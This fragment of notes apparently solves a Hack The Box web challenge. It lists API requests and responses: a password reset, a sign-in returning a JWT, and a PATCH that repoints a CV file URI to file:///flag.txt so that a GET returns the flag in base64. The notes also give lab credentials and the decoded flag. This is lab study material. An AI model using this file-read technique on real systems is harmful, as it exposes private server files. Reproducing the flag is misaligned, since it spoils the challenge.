        "SecurityQuestionAnswer": "rust",  
        "NewPassword": "Aa!123456"  
        }
        - "successStatus":true
- /api/v2/authentication/suppliers/sign-in
  - {  
    "Email": "B.Rogers1535@globalsolutions.com",  
    "Password": "Aa!123456"  
    }
    - eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IkIuUm9nZXJzMTUzNUBnbG9iYWxzb2x1dGlvbnMuY29tIiwiZXhwIjoxNzc5ODIzODgzLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.LjpL03yr5l0-Oph3ATkbwbmolMDWSbpmk6iwOhSzlpxUx_W8qcUr3eWD3KDLCXv7xb4RanPnQ0555lVPb8DwCg
- /api/v2/roles/current-user
  - "errorMessage": "User does not have any roles assigned"
- /api/v2/suppliers/current-user/cv
  - upload CV.pdf
    - {  
      "successStatus": true,  
      "fileURI": "file:///app/wwwroot/SupplierCVs/cv2.pdf",  
      "fileSize": 51206  
      }
- /api/v2/suppliers/current-user
  - GET
    - {  
      "supplier": {  
      "id": "36f17195-395f-443e-93a4-8ceee81c6106",  
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",  
      "name": "Brandon Rogers",  
      "email": "B.Rogers1535@globalsolutions.com",  
      "securityQuestion": "What is your favorite color?",  
      "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf"  
      }  
      }
  - PATCH
    - {  
      "SecurityQuestion": "What is your favorite color?",  
      "SecurityQuestionAnswer": "rust",  
      "ProfessionalCVPDFFileURI": "file:///flag.txt",  
      "PhoneNumber": "string",  
      "Password": "Aa!123456"  
      }
      - "SuccessStatus": true
- /api/v2/suppliers/current-user/cv
  - GET
    - {  
      "successStatus": true,  
      "base64Data": "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo="  
      }
      - decode base64
        - HTB{f190b80cd543a84b236e92a07a9d8d59}
